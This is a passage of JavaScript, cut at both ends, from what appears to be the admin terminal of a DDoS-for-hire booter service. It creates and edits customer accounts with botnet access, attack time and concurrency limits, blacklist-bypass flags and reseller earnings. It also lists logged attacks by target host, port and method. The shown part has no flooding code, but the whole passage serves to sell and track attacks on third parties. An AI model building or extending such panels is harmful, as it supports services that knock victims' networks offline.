            buffer = '';
            cursorIndex = 0;
            lastDrawnLengthRef.value = 0;
            promptLength = q.text.length + 1;
            const prefix = index === 0 ? '' : '\r\n';
            stream?.write(`${prefix}${q.text} `);
        };

        const listener = (data) => {
            const raw = data.toString('utf-8');

            if (raw === '\x03') {
                stream?.write('\r\nUser creation canceled.\r\n');
                stream?.removeListener('data', listener);
                reject(new Error('User creation canceled'));
                return;
            }

            if (raw === '\x1b[D') { if (cursorIndex > 0) cursorIndex--; globalThis.redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef); return; }
            if (raw === '\x1b[C') { if (cursorIndex < buffer.length) cursorIndex++; globalThis.redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef); return; }
            if (raw === '\x1b[A' || raw === '\x1b[B') return;
            if (raw === '\x7f' || raw === '\b') {
                if (cursorIndex > 0) {
                    buffer = buffer.slice(0, cursorIndex - 1) + buffer.slice(cursorIndex);
                    cursorIndex--;
                    globalThis.redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
                }
                return;
            }

            if (raw === '\r' || raw === '\n') {
                const inputLine = buffer.trim();
                const q = questions[index];
                if (!q.optional || inputLine !== '') inputs[q.key] = inputLine;
                index++;
                askQuestion();
                return;
            }

            buffer = buffer.slice(0, cursorIndex) + raw + buffer.slice(cursorIndex);
            cursorIndex += raw.length;
            globalThis.redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
        };

        stream?.on('data', listener);
        askQuestion();
    });

    try {
        const inputs = await getUserInputs().catch(err => {
            stream?.write(`Error collecting inputs: ${err.message}\r\n`);
            return {};
        });

        let {
            username, concurrents, maxTime, expiry,
            admin = 'n', reseller = 'n',
            botnet, homeholder, api, vip, spambypass, blacklistbypass,
            cooldown, role = 'user'
        } = inputs;

        // Only root can assign admin/reseller roles
        if ((role === 'admin' || role === 'reseller') && user?.role !== 'root') {
            stream?.write(`\r\nOnly root can assign role "${role}". Defaulting to "user".\r\n`);
            role = 'user';
        }

        const parsedConcurrents = parseInt(concurrents);
        const parsedMaxTime = parseInt(maxTime);
        const parsedCooldown = parseInt(cooldown);
        if (isNaN(parsedConcurrents) || isNaN(parsedMaxTime) || isNaN(parsedCooldown)) {
            stream?.write('Invalid concurrents, maxTime, or cooldown value. Must be a number.\r\n');
            if (pauseRef) pauseRef.value = false;
            return;
        }

        if (await db.hasKey('username', username.toLowerCase(), config.mongo_db_collection).catch(() => false)) {
            stream?.write('A user with that name already exists. Pick another.\r\n');
            if (pauseRef) pauseRef.value = false;
            return;
        }

        const tempPass = Math.random().toString(36).slice(-8);
        const hashedPass = await bcrypt.hash(tempPass, 10);

        // Calculate expiry date
        let expiryDate;
        const expiryStr = String(expiry || '').trim().toLowerCase();
        if (expiryStr === 'lifetime' || expiryStr === 'forever') {
            expiryDate = 'Lifetime';
        } else {
            const days = parseInt(expiryStr);
            if (isNaN(days) || days < 0) {
                stream?.write('Invalid expiry value. Must be a number of days or "Lifetime".\r\n');
                if (pauseRef) pauseRef.value = false;
                return;
            }
            const now = new Date();
            now.setDate(now.getDate() + days);
            expiryDate = `${now.getMonth() + 1}/${now.getDate()}/${now.getFullYear()}`;
        }

        const newUser = {
            username: username.toLowerCase(),
            password: hashedPass,
            role,
            expiry: expiryDate,
            maxTime: parsedMaxTime,
            concurrents: parsedConcurrents,
            admin: admin === 'y' && user?.role === 'root',
            reseller: reseller === 'y' && user?.role === 'root',
            botnet: botnet === 'y',
            homeholder: homeholder === 'y',
            api: api === 'y',
            vip: vip === 'y',
            spambypass: spambypass === 'y',
            blacklistbypass: blacklistbypass === 'y',
            banned: false,
            cooldown: parsedCooldown,
            createdby: user.username,
        };

        if (reseller === 'y' && user?.role === 'root') {
            newUser.earnings = 0;
            newUser.owed = 0;
            newUser.usersSold = 0;
        }

        const dbResult = await db.addDocument(newUser, config.mongo_db_collection).catch(err => {
            stream?.write(`Error adding user to database: ${err.message}\r\n`);
            console.error(err);
            return null;
        });
        if (!dbResult) { if (pauseRef) pauseRef.value = false; return; }

        if (user.reseller) {
            user.owed = user.owed || 0;
            user.earnings = user.earnings || 0;
            user.usersSold = (user.usersSold || 0) + 1;
            await db.updateDocumentByKey('username', user.username, user, config.mongo_db_collection).catch(err => console.error(err));
        }

        globalThis.logToFile(globalThis.LogPaths.CreatedUsers, 'Created new user', {
            createdBy: user.username,
            newUser: newUser.username,
            maxTime: newUser.maxTime,
            concurrents: newUser.concurrents,
            expiryDate: newUser.expiry,
            role: newUser.role,
            admin: newUser.admin,
            reseller: newUser.reseller,
            vip: newUser.vip
        });

        // Output credentials before clearing screen
        globalThis.clearScreen(stream);
        stream?.write(`Username: ${username}\r\n`);
        stream?.write(`Password: ${tempPass}\r\n`);
        stream?.write(`Expiry: ${newUser.expiry}\r\n`);
        stream?.write(`Concurrents: ${newUser.concurrents}\r\n`);
        stream?.write(`Max Time: ${newUser.maxTime}s\r\n`);

    } catch (error) {
        console.error(error?.message ?? 'User creation canceled.');
    } finally {
        if (pauseRef) pauseRef.value = false;
    }
}

    else if (command === 'editall' && user?.admin) {
        if (params.length < 2) {
            stream?.write('[38;5;39musage:[97m editall <type> <value>\r\n');
            stream?.write('[38;5;39mTypes:[97m\r\n');
            stream?.write('[38;5;39m┌─ expiry          [97m<MM/DD/YYYY | "forever">\r\n');
            stream?.write('[38;5;39m├─ role            [97m<string>\r\n');
            stream?.write('[38;5;39m├─ add_days        [97m<int> (adds days to expiry for the users)\r\n');;
            stream?.write('[38;5;39m├─ concurrents     [97m<int32>\r\n');
            stream?.write('[38;5;39m├─ cooldown        [97m<int32>\r\n');
            stream?.write('[38;5;39m├─ owed            [97m<int32>\r\n');
            stream?.write('[38;5;39m├─ maxTime         [97m<int32>\r\n')
            stream?.write('[38;5;39m├─ admin           [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ reseller        [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ botnet          [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ api             [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ vip             [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ spambypass      [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ blacklistbypass [97m<true | false>\r\n');
            stream?.write('[38;5;39m├─ homeholder      [97m<true | false>\r\n');
            stream?.write('[38;5;39m└─ banned          [97m<true | false>\r\n');
            return;
        }
        const [type, value] = params;
        const collection = db.getCollection?.(config.mongo_db_collection) || { find: () => ({ toArray: () => [] }), updateOne: () => {}, updateMany: () => ({ modifiedCount: 0 }) };
        if (type === 'add_days') {
            const daysToAdd = parseInt(value);
            if (isNaN(daysToAdd)) {
                stream?.write('[97mError:[97m Value must be an integer for add_days\r\n');
                return;
            }
            const allUsers = await collection.find({}).toArray().catch(() => []);
            let updatedCount = 0;
            for (const u of allUsers) {
                if (!u.expiry || u.expiry.toLowerCase() === 'forever') continue;
                let expiryDate = new Date(u.expiry);
                if (isNaN(expiryDate.getTime())) continue;
                expiryDate.setDate(expiryDate.getDate() + daysToAdd);
                const formattedDate = `${expiryDate.getMonth() + 1}/${expiryDate.getDate()}/${expiryDate.getFullYear()}`;
                await collection.updateOne({ username: u.username }, { $set: { expiry: formattedDate } }).catch(() => {});
                updatedCount++;
            }
            stream?.write(`[97mUpdated expiry date for ${updatedCount} users by adding ${daysToAdd} days[97m\r\n`);
            return;
        }
        const update = {};
        if (['admin', 'homeholder', 'reseller', 'api', 'botnet', 'vip', 'spambypass', 'blacklistbypass', 'banned'].includes(type)) {
            update[type] = value === 'true';
        } 
        else if (['cooldown', 'concurrents', 'maxTime', 'owed'].includes(type)) {
            const intValue = parseInt(value);
            if (isNaN(intValue)) {
                stream?.write('[97mError:[97m Value must be an integer\r\n');
                return;
            }
            update[type] = intValue;
        } 
        else if (['role', 'expiry'].includes(type)) {
            update[type] = value;
        } 
        else {
            stream?.write(`[97mError:[97m Unknown type '${type}'\r\n`);
            return;
        }
        const result = await collection.updateMany({}, { $set: update }).catch(() => ({ modifiedCount: 0 }));
        globalThis.logToFile(globalThis.LogPaths.UserEdits, 'Edited all user accounts', {
            editedBy: user.username,
            updatedField: type,
            newValue: update[type]
        });
        stream?.write(`[97mUpdated ${result.modifiedCount} users: ${type} = ${update[type]}[97m\r\n`);
    }
    else if (command === 'userscount' && user?.admin) {
    const collection = db.getCollection?.(config.mongo_db_collection) || { find: () => ({ toArray: () => [] }) };
    const allUsers = await collection.find({}).toArray().catch(() => []);

    let activeCount = 0;
    let expiredCount = 0;
    let apiCount = 0;
    let cncCount = 0;

    const now = new Date();

    for (const u of allUsers) {
        // Count API / CNC
        if (u.api === true) {
            apiCount++;
        } else {
            cncCount++;
        }

        // Count expiry
        if (!u.expiry || u.expiry.toLowerCase?.() === 'forever') {
            activeCount++;
            continue;
        }

        const expiryDate = new Date(u.expiry);
        if (isNaN(expiryDate.getTime())) {
            expiredCount++; // invalid or missing date
            continue;
        }

        if (expiryDate >= now) {
            activeCount++;
        } else {
            expiredCount++;
        }
    }

    const totalCount = allUsers.length;

    stream?.write(`[38;5;39mTotal Users:[97m ${totalCount}\r\n`);
    stream?.write(`[38;5;39mActive Users:[97m ${activeCount}\r\n`);
    stream?.write(`[38;5;39mExpired Users:[97m ${expiredCount}\r\n`);
    stream?.write(`[38;5;39mAPI Users:[97m ${apiCount}\r\n`);
    stream?.write(`[38;5;39mCNC Users:[97m ${cncCount}\r\n`);
}
else if (command === 'edituser' && user?.admin) {
  if (params.length < 3) {
    stream?.write('[38;5;39musage:[97m edituser <username> <type> <value>\r\n');
    stream?.write('[38;5;39mTypes:[97m\r\n');
    stream?.write('[38;5;39m┌─ expiry [97m<MM/DD/YYYY | "forever">\r\n');
    stream?.write('[38;5;39m├─ role [97m<string>\r\n');
    stream?.write('[38;5;39m├─ add_days [97m<int> (adds days to expiry for the users)\r\n');
    stream?.write('[38;5;39m├─ concurrents [97m<int32>\r\n');
    stream?.write('[38;5;39m├─ cooldown [97m<int32>\r\n');
    stream?.write('[38;5;39m├─ owed [97m<int32>\r\n');
    stream?.write('[38;5;39m├─ maxTime [97m<int32>\r\n');
    stream?.write('[38;5;39m├─ admin [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ reseller [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ botnet [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ api [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ vip [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ spambypass [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ blacklistbypass [97m<true | false>\r\n');
    stream?.write('[38;5;39m├─ homeholder [97m<true | false>\r\n');
    stream?.write('[38;5;39m└─ banned [97m<true | false>\r\n');
    return;
  }

  const [username, type, value] = params;
  const collection = db.getCollection?.(config.mongo_db_collection) || {
    find: () => ({ toArray: () => [] }),
    updateOne: () => {},
    updateMany: () => ({ modifiedCount: 0 })
  };

  if (user?.username !== 'root' && type === 'removeuser') {
    stream?.write('[97mError:[97m Only root can remove users\r\n');
    return;
  }

  // Validate stream
  if (!stream?.writable) {
    console.error('Stream is not writable');
    stream?.write('[97mError:[97m Internal server error\r\n');
    return;
  }

  const targetUsers = await collection.find({ username }).toArray().catch(() => []);
  if (!targetUsers.length) {
    stream?.write(`[97mError:[97m User '${username}' not found\r\n`);
    return;
  }

  const targetUser = targetUsers[0];
  const update = {};

  // Handle "add_days" for expiry
  if (type === 'add_days') {
    const daysToAdd = parseInt(value);
    if (isNaN(daysToAdd)) {
      stream?.write('[97mError:[97m Value must be an integer for add_days\r\n');
      return;
    }
    if (!targetUser.expiry || (typeof targetUser.expiry === 'string' && targetUser.expiry.toLowerCase() === 'forever')) {
      stream?.write(`[97mError:[97m User '${username}' has no expiry or is set to 'forever'\r\n`);
      return;
    }
    let expiryDate = new Date(targetUser.expiry);
    if (isNaN(expiryDate.getTime())) {
      stream?.write(`[97mError:[97m Invalid expiry date format for '${username}'\r\n`);
      return;
    }
    expiryDate.setDate(expiryDate.getDate() + daysToAdd);
    const formattedDate = `${expiryDate.getMonth() + 1}/${expiryDate.getDate()}/${expiryDate.getFullYear()}`;
    await collection.updateOne({ username }, { $set: { expiry: formattedDate } }).catch(() => {});
    stream?.write(`[97mUpdated expiry date for user '${username}' by adding ${daysToAdd} days[97m\r\n`);
    return;
  }

  // Handle boolean fields
  if (['admin', 'homeholder', 'reseller', 'api', 'botnet', 'vip', 'spambypass', 'blacklistbypass', 'banned'].includes(type)) {
    if (type === 'banned') {
      if (value === 'true') {
        // Use stream 'data' event to capture input with echoing
        stream.write('Enter reason: ');
        
        // Save any existing 'data' listener
        const originalDataListener = stream.listeners('data')[0] || null;
        stream.removeAllListeners('data');
        
        let inputBuffer = '';
        const reasonPromise = new Promise((resolve, reject) => {
          const dataHandler = (data) => {
            const input = data.toString();
            
            // Handle backspace (ASCII 8 or 127)
            if (input.includes('\b') || input.includes(String.fromCharCode(127))) {
              if (inputBuffer.length > 0) {
                inputBuffer = inputBuffer.slice(0, -1);
                stream.write('\b \b');
              }
              return;
            }
            
            // Echo printable characters and accumulate
            if (!input.match(/[\r\n]/)) {
              stream.write(input);
              inputBuffer += input;
            }
            
            // Check for line ending
            if (input.match(/\r\n|\n|\r/)) {
              const reason = inputBuffer.trim() || 'No reason provided';
              stream.removeListener('data', dataHandler);
              if (originalDataListener) stream.on('data', originalDataListener);
              resolve(reason);
            }
          };
          
          const errorHandler = (err) => {
            console.error('Stream error:', err);
            stream.removeListener('data', dataHandler);
            if (originalDataListener) stream.on('data', originalDataListener);
            reject(err);
          };
          
          stream.on('data', dataHandler);
          stream.once('error', errorHandler);
        });
        
        let reason;
        try {
          reason = await reasonPromise;
        } catch (err) {
          console.error('Input capture error:', err);
          if (originalDataListener) stream.on('data', originalDataListener);
          stream.write('\r\n');
          stream?.write('[97mError:[97m Failed to capture ban reason\r\n');
          return;
        }
        
        // Write newline to clean prompt
        stream.write('\r\n');
        
        update.banned = true;
        update.banReason = reason;
      } else {
        // Unban clears reason
        update.banned = false;
        update.banReason = '';
      }
    } else {
      update[type] = value === 'true';
    }
  }
  // Handle integer fields
  else if (['cooldown', 'concurrents', 'maxTime', 'owed'].includes(type)) {
    const intValue = parseInt(value);
    if (isNaN(intValue)) {
      stream?.write('[97mError:[97m Value must be an integer\r\n');
      return;
    }
    update[type] = intValue;
  }
  // Handle string fields
  else if (['role', 'expiry'].includes(type)) {
    update[type] = value;
  }
  // Handle password field
  else if (type === 'password') {
    if (value.length < 4) {
      stream?.write('[97mError:[97m Password must be at least 4 characters long\r\n');
      return;
    }
    try {
      const hashedPassword = await bcrypt.hash(value, 10);
      update.password = hashedPassword;
    } catch (err) {
      console.error('Password hashing error:', err);
      stream?.write('[97mError:[97m Error hashing the password\r\n');
      return;
    }
  } else {
    stream?.write(`[97mError:[97m Unknown type '${type}'\r\n`);
    return;
  }

  // Log changes
  globalThis.logToFile(globalThis.LogPaths.UserEdits, 'Edited user account', {
    editedBy: user.username,
    targetUser: username,
    updatedField: type,
    newValue: type === 'password' ? '[HIDDEN]' : update[type]
  });

  await db.updateDocumentByKey('username', username, update, config.mongo_db_collection).catch(err => console.error('Database update error:', err));
  stream?.write('[97mUser Update Successful[97m\r\n');
  stream?.write(`[38;5;39m┌─ Username[97m : ${username}\r\n`);
  stream?.write(`[38;5;39m└─ Updated [97m : ${type} = ${type === 'password' ? '[HIDDEN]' : (type === 'banned' && update.banned ? 'true (reason: ' + update.banReason + ')' : update[type])}\r\n`);
}
// NEW: Remove user command (only allowed for root)
else if (command === 'removeuser') {
    if (user?.username !== 'root') {
        stream?.write('[97mError:[97m Only root can remove users\r\n');
        return;
    }

    if (params.length < 1) {
        stream?.write('[38;5;39musage:[97m removeuser <username>\r\n');
        return;
    }

    const [targetUser] = params;
    const collection = db.getCollection?.(config.mongo_db_collection);
    if (!collection) {
        stream?.write('[97mError:[97m Database collection not found\r\n');
        return;
    }

    try {
        const result = await collection.deleteOne({ username: targetUser });
        if (result.deletedCount > 0) {
            globalThis.logToFile(globalThis.LogPaths.UserEdits, 'Removed user account', {
                removedBy: user.username,
                targetUser
            });
            stream?.write(`[97mUser '${targetUser}' removed successfully[97m\r\n`);
        } else {
            stream?.write(`[97mError:[97m User '${targetUser}' not found\r\n`);
        }
    } catch (err) {
        console.error(err);
        stream?.write(`[97mError:[97m Could not remove user\r\n`);
    }
}

    else if (command === 'viewplan' && user?.admin) {
    const targetUsername = params[0];
    if (!targetUsername) {
        stream?.write('usage: viewplan <username>\r\n');
        return;
    }
    if (targetUsername === 'root' && user.username !== 'root') {
        stream?.write('Only root can view this plan.\r\n');
        return;
    }

    const userData = await db.findDocumentByKey('username', targetUsername, config.mongo_db_collection).catch(() => null);
    if (!userData) {
        stream?.write('User not found.\r\n');
        return;
    }

    const rawText = pageContents['view_plan'] || '';
    if (!rawText) {
        stream?.write('Error: plan template not found.\r\n');
        return;
    }

    globalThis.clearScreen(stream);
    let replacedText = (globalThis.replaceplan || ((t, u) => t))(rawText, userData);
    replacedText = (globalThis.replaceUsername || ((t, u) => t))(replacedText, userData);
    replacedText = (globalThis.sanitizeAdminLines || ((t, u) => t))(replacedText, userData);

    stream?.write(`${replacedText}\r\n`);
}
    else if (command === 'viewbrute' && user?.admin) {
    globalThis.clearScreen(stream);
    
    const blockedIPs = globalThis.getBlockedIPs ? globalThis.getBlockedIPs() : [];
    
    if (blockedIPs.length === 0) {
        stream?.write('\x1b[97mNo blocked IPs found.\r\n');
        return;
    }
    
    // Format table
    const headers = ['#', 'IP Address', 'Blocked At', 'Attempts'];
    const maxLengths = {
        '#': Math.max(...blockedIPs.map((_, i) => String(i + 1).length), 1),
        'IP Address': Math.max(...blockedIPs.map(e => e.ip.length), 'IP Address'.length),
        'Blocked At': Math.max(...blockedIPs.map(e => {
            const date = new Date(e.blockedAt);
            return date.toLocaleString();
        }).map(s => s.length), 'Blocked At'.length),
        'Attempts': Math.max(...blockedIPs.map(e => String(e.attempts || 6).length), 'Attempts'.length)
    };
    
    // Top border
    const topBorder = '╔' + [
        '═'.repeat(maxLengths['#'] + 2),
        '═'.repeat(maxLengths['IP Address'] + 2),
        '═'.repeat(maxLengths['Blocked At'] + 2),
        '═'.repeat(maxLengths['Attempts'] + 2)
    ].join('╦') + '╗\r\n';
    
    // Header row
    const headerRow = '║ ' +
        '#'.padEnd(maxLengths['#']) + ' ║ ' +
        'IP Address'.padEnd(maxLengths['IP Address']) + ' ║ ' +
        'Blocked At'.padEnd(maxLengths['Blocked At']) + ' ║ ' +
        'Attempts'.padEnd(maxLengths['Attempts']) + ' ║\r\n';
    
    // Middle border
    const midBorder = '╠' + [
        '═'.repeat(maxLengths['#'] + 2),
        '═'.repeat(maxLengths['IP Address'] + 2),
        '═'.repeat(maxLengths['Blocked At'] + 2),
        '═'.repeat(maxLengths['Attempts'] + 2)
    ].join('╬') + '╣\r\n';
    
    // Data rows
    const rows = blockedIPs.map((entry, index) => {
        const date = new Date(entry.blockedAt);
        const formattedDate = date.toLocaleString();
        return '\x1b[97m║ ' +
            String(index + 1).padEnd(maxLengths['#']) + ' ║ ' +
            entry.ip.padEnd(maxLengths['IP Address']) + ' ║ ' +
            formattedDate.padEnd(maxLengths['Blocked At']) + ' ║ ' +
            String(entry.attempts || 6).padEnd(maxLengths['Attempts']) + ' ║\x1b[97m';
    }).join('\r\n');
    
    // Bottom border
    const bottomBorder = '╚' + [
        '═'.repeat(maxLengths['#'] + 2),
        '═'.repeat(maxLengths['IP Address'] + 2),
        '═'.repeat(maxLengths['Blocked At'] + 2),
        '═'.repeat(maxLengths['Attempts'] + 2)
    ].join('╩') + '╝\r\n';
    
    stream?.write('\x1b[0m\x1b[97m' + topBorder + headerRow + midBorder + rows + '\r\n' + bottomBorder + '\x1b[97m');
    stream?.write(`\r\nTotal blocked IPs: ${blockedIPs.length}\r\n`);
    stream?.write(`\r\nUse "unblockip <ip>" to unblock an IP address.\r\n`);
}
    else if (command === 'unblockip' && user?.admin) {
    const ipToUnblock = params[0];
    if (!ipToUnblock) {
        stream?.write('usage: unblockip <ip_address>\r\n');
        return;
    }
    
    if (!globalThis.unblockIP || !globalThis.removeBlockedIP) {
        stream?.write('Error: Unblock functions not available.\r\n');
        return;
    }
    
    // Remove from iptables
    const iptablesResult = globalThis.unblockIP(ipToUnblock);
    
    // Remove from blocked list
    const listResult = globalThis.removeBlockedIP(ipToUnblock);
    
    if (iptablesResult || listResult) {
        stream?.write(`\x1b[32mSuccessfully unblocked IP: ${ipToUnblock}\x1b[0m\r\n`);
        globalThis.logToFile(
            globalThis.LogPaths.LoginAttempts,
            `UNBLOCKED - IP: ${ipToUnblock} - Unblocked by: ${user.username}`
        );
    } else {
        stream?.write(`\x1b[31mIP ${ipToUnblock} was not found in blocked list.\x1b[0m\r\n`);
    }
}

    else if (command === 'games') {
    const availableGames = [
        { name: 'Snake', description: 'Classic snake game' },
        { name: 'Asteroids', description: 'Destroy falling rocks before they hit you!' }
    ];

    if (!params[0]) {
        stream?.write(`\rAvailable Games (${availableGames.length}):\r\n`);
        availableGames.forEach((game, index) => {
            stream?.write(` ${index + 1}. ${game.name} - ${game.description}\r\n`);
        });
        stream?.write(`\rType: games <number> to play a game.\r\n`);
        return;
    }

    const gameIndex = parseInt(params[0], 10) - 1;
    if (isNaN(gameIndex) || gameIndex < 0 || gameIndex >= availableGames.length) {
        stream?.write('Invalid game number.\r\n');
        return;
    }

    const selectedGame = availableGames[gameIndex];
    stream?.write(`Starting ${selectedGame.name}...\r\n`);

    const loadingFrames = ['[=     ]', '[==    ]', '[===   ]', '[====  ]', '[===== ]', '[======]'];
    let frame = 0;
    const loadingInterval = setInterval(() => {
        stream?.write(`\x1B[1A\x1B[2KLoading ${loadingFrames[frame % loadingFrames.length]}\r\n`);
        frame++;
        if (frame > 8) {
            clearInterval(loadingInterval);
            stream?.write('Loading complete!\r\n');
            if (selectedGame.name === 'Snake') startSnakeGame(stream);
            else if (selectedGame.name === 'Asteroids') startAsteroidsGame(stream);
        }
    }, 200);
}
else if (command === 'viewlogs' && user?.admin) {
    const filterType = params[0];
    const filterValue = params[1];
    
    const validFilters = ['username', 'host', 'port', 'time', 'method', 'date', 'datetime', 'all'];
    if (!filterType || (filterType !== 'all' && !validFilters.includes(filterType)) || (filterType !== 'all' && !filterValue)) {
        globalThis.clearScreen(stream);
        stream?.write('[8;24;80t[38;5;39m │ [38;5;39mViewlogs Usage[97m:\r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs username <username>]\r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs host <host>]        \r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs port <port>]        \r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs time <time>]        \r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs method <method>]    \r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs date <date>]        \r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs datetime <datetime>]\r\n');
        stream?.write('[38;5;39m │ [97m[viewlogs all]\r\n');
        stream?.write('[97m\r');
    return;
    }

    console.log('Looking for attack log at:', attacklogs);
    if (await fsp.access(attacklogs).then(() => true).catch(() => false)) {
        const lines = (await fsp.readFile(attacklogs, 'utf-8').catch(() => '')).trim().split('\n');
        const entries = [];
        const headers = ['#', 'User', 'Target', 'Port', 'Time', 'Method', 'Datetime'];
        const maxLengths = {
            '#': 1,
            User: 'User'.length,
            Target: 'Target'.length,
            Port: 'Port'.length,
            Time: 'Time'.length,
            Method: 'Method'.length,
            Datetime: 'Datetime'.length
        };
        let malformedCount = 0;

        lines.forEach((line, index) => {
            try {
                const jsonMatch = line.match(/Sent attack (.*)$/);
                if (jsonMatch && jsonMatch[1]) {
                    const entry = JSON.parse(jsonMatch[1]);
                    const row = {
                        '#': (entries.length + 1).toString(),
                        User: entry.user || 'N/A',
                        Target: entry.target || 'N/A',
                        Port: entry.port?.toString() || 'N/A',
                        Time: entry.time?.toString() || 'N/A',
                        Method: entry.method || 'N/A',
                        Datetime: entry.datetime || 'N/A'
                    };
                    let include = false;
                    if (filterType === 'all') {
                        include = true;
                    } 
                    else if (filterType === 'username' && row.User === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'host' && row.Target === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'port' && row.Port === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'time' && row.Time === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'method' && row.Method === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'date' && row.Datetime.split(',')[0].trim() === filterValue) {
                        include = true;
                    } 
                    else if (filterType === 'datetime' && row.Datetime === filterValue) {
                        include = true;
                    }
                    if (include) {
                        for (const key in row) {
                            if (row[key].length > maxLengths[key]) maxLengths[key] = row[key].length;
                        }
                        entries.push(row);
                    }
                } 
                else {
                    malformedCount++;
                }
            } 
            catch (e) {
                console.error(`Malformed log line ${index}:`, e.message);
                malformedCount++;
            }
        });

        if (entries.length === 0) {
            stream?.write(filterType === 'all' ? 'No valid log entries found.\r\n' : `No entries found for ${filterType} "${filterValue}".\r\n`);
            return;
        }

        globalThis.clearScreen(stream);
        const headerLine = headers.map(h => h.padEnd(maxLengths[h])).join('  ') + '\r\n';
        stream?.write(headerLine);
        stream?.write(`${'='.repeat(headerLine.length - 2)}\r\n`);
        entries.forEach((entry, idx) => {
            entry['#'] = (idx + 1).toString();
            const rowLine = headers.map(h => entry[h].padEnd(maxLengths[h])).join('  ') + '\r\n';
            stream?.write(rowLine);
        });

        if (malformedCount > 0) {
            stream?.write(`\r\n[${malformedCount} malformed log line${malformedCount > 1 ? 's' : ''} skipped]\r\n`);
        }
    } 
    else {
        stream?.write('Log file not found.\r\n');
    }
}
    else if (command === 'online') {
    globalThis.clearScreen(stream);
    const activeUserMap = new Map();
    if (activeSessions) {
        for (const session of activeSessions.values()) {
            if (session?.user?.username) {
                activeUserMap.set(session.user.username, session.user);
            }
        }
    }

    const updatedUsers = [...activeUserMap.values()].map((u, i) => {
        return {
            index: i + 1,
            username: u.username || '',
            maxTime: u.maxTime || 0,
            concurrents: u.concurrents || 0,
            cooldown: u.cooldown || 0,
            expiry: u.expiry || 'N/A',
            ranks: {
                raw: [u.vip && 'V', u.admin && 'A', u.reseller && 'R'].filter(Boolean).join('   '),
                admin: u.admin,
                reseller: u.reseller,
                regular: !u.admin && !u.reseller
            }
        };
    });


    function getRankColorTag(ranksObj) {
        const parts = [];
        if (ranksObj.admin) {
            parts.push('\x1b[48;2;255;0;0m\x1b[30m A \x1b[0m'); // red bg, black text
        }
        if (ranksObj.reseller) {
            parts.push('\x1b[48;2;0;0;139m\x1b[97m R \x1b[0m'); // dark blue bg, white text
        }
        if (ranksObj.raw.includes('V')) {
            parts.push('\x1b[48;2;255;255;0m\x1b[30m V \x1b[0m'); // yellow bg, black text
        }
        return parts.join(' ');
    }

    // Calculate column widths dynamically based on content visible length
    const colWidths = {
        index: Math.max(...updatedUsers.map(u => u.index.toString().length), 1),
        username: Math.max(...updatedUsers.map(u => u.username.length), 4),
        maxTime: Math.max(...updatedUsers.map(u => u.maxTime.toString().length), 4),
        concurrents: Math.max(...updatedUsers.map(u => u.concurrents.toString().length), 5),
        cooldown: Math.max(...updatedUsers.map(u => u.cooldown.toString().length), 2),
        expiry: Math.max(...updatedUsers.map(u => u.expiry.length), 6),
        ranks: Math.max(
            ...updatedUsers.map(u => globalThis.stripAnsi(getRankColorTag(u.ranks)).length),
            'Ranks'.length
        )
    };

    const repeat = (char, times) => char.repeat(times);

    const topBorder = '╔' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╦') + '╗\r\n';

    const midBorder = '╠' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╬') + '╣\r\n';

    const bottomBorder = '╚' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╩') + '╝\r\n';

    const headerRow = '║ ' +
        '#'.padEnd(colWidths.index) + ' ║ ' +
        'User'.padEnd(colWidths.username) + ' ║ ' +
        'Time'.padEnd(colWidths.maxTime) + ' ║ ' +
        'Concs'.padEnd(colWidths.concurrents) + ' ║ ' +
        'CD'.padEnd(colWidths.cooldown) + ' ║ ' +
        'Expiry'.padEnd(colWidths.expiry) + ' ║ ' +
        'Ranks'.padEnd(colWidths.ranks) + ' ║\r\n';

    // Build rows, pad ranks accounting for invisible ANSI codes
    const userRows = updatedUsers.map(u => {
        const rankStr = getRankColorTag(u.ranks);
        const visibleRankLength = globalThis.stripAnsi(rankStr).length;
        const padAmount = colWidths.ranks - visibleRankLength;
        const paddedRank = rankStr + ' '.repeat(padAmount);

        return (
            '\x1b[97m' + // white text for entire row
            '║ ' + u.index.toString().padEnd(colWidths.index) + ' ║ ' +
            u.username.padEnd(colWidths.username) + ' ║ ' +
            u.maxTime.toString().padEnd(colWidths.maxTime) + ' ║ ' +
            u.concurrents.toString().padEnd(colWidths.concurrents) + ' ║ ' +
